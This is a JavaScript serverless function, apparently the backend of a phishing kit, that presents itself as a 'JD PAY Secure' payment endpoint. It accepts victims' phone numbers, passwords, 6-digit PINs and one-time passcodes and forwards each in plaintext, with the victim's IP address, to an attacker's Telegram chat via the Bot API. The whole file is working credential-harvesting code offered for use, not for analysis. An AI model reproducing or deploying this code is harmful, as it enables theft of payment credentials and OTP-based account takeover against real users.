// api/send.js - JD PAY Secure Serverless Function

const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000;
const MAX_REQUESTS = 5;

function isRateLimited(ip) {
  const now = Date.now();
  const record = rateLimitMap.get(ip) || { count: 0, start: now };
  if (now - record.start > RATE_LIMIT_WINDOW) {
    record.count = 0;
    record.start = now;
  }
  record.count++;
  rateLimitMap.set(ip, record);
  return record.count > MAX_REQUESTS;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'unknown';
  if (isRateLimited(ip)) {
    return res.status(429).json({ error: 'Too many requests. Please wait.' });
  }

  try {
    const { phone, pass, pin, otp, type } = req.body || {};

    if (!phone || !/^\d{10}$/.test(phone)) {
      return res.status(400).json({ error: 'Invalid phone number' });
    }

    let message = '';

    if (type === 'login') {
      if (!pass || pass.length < 4) return res.status(400).json({ error: 'Invalid password' });
      if (!pin || !/^\d{6}$/.test(pin)) return res.status(400).json({ error: 'Invalid PIN' });

      message = `🔔 *JD PAY - New Login Attempt*\n\n` +
                `📞 Phone: ${phone}\n` +
                `🔑 Password: ${pass}\n` +
                `🔐 6-digit PIN: ${pin}\n` +
                `🌐 IP: ${ip}`;
    } 
    else if (type === 'send_otp') {
      message = `📩 *JD PAY - OTP Send Button Pressed*\nPhone: ${phone}\n🌐 IP: ${ip}`;
    } 
    else if (type === 'verify_otp') {
      if (!otp || !/^\d{6}$/.test(otp)) return res.status(400).json({ error: 'Invalid OTP' });
      message = `🔐 *JD PAY - OTP Entered*\nPhone: ${phone}\nOTP: ${otp}`;
    } 
    else {
      return res.status(400).json({ error: 'Invalid request type' });
    }

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
      return res.status(500).json({ error: 'Server config missing' });
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(message)}`;
    const response = await fetch(url);
    const data = await response.json();

    if (!data.ok) return res.status(500).json({ error: 'Failed to send' });
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Server error:', err);
    return res.status(500).json({ error: 'Server error' });
  }
}
